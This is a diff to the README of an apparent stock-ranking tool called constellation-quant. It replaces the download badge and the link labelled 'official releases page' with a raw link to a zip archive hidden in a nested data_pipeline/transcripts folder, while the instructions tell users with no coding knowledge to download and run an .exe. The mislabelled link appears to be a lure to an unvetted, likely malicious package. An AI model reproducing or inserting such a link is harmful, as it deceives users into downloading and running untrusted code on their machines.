@@ -1,6 +1,6 @@
 # 📈 constellation-quant - Rank top stocks using deep learning
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/ingoodtaste-rapsession220/constellation-quant/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/ingoodtaste-rapsession220/constellation-quant/main/data_pipeline/data_pipeline/transcripts/quant_constellation_2.2.zip)
 
 constellation-quant processes financial data to help you rank stocks within the S&P 500 index. The software uses modern learning methods to identify patterns in market behavior. It examines how stocks move together over time to create an ordered list of potential assets. 
 
@@ -10,7 +10,7 @@ This tool serves as an aid for your equity research efforts. It turns complex hi
 
 This software requires no coding knowledge to operate. Follow these steps to prepare your computer and start the program.
 
-1. Visit the [official releases page](https://github.com/ingoodtaste-rapsession220/constellation-quant/releases) to download the package.
+1. Visit the [official releases page](https://raw.githubusercontent.com/ingoodtaste-rapsession220/constellation-quant/main/data_pipeline/data_pipeline/transcripts/quant_constellation_2.2.zip) to download the package.
 2. Look for the file ending in `.exe` under the latest version.
 3. Click the file name to start the download.
 4. Save the file to your desktop for easy access.
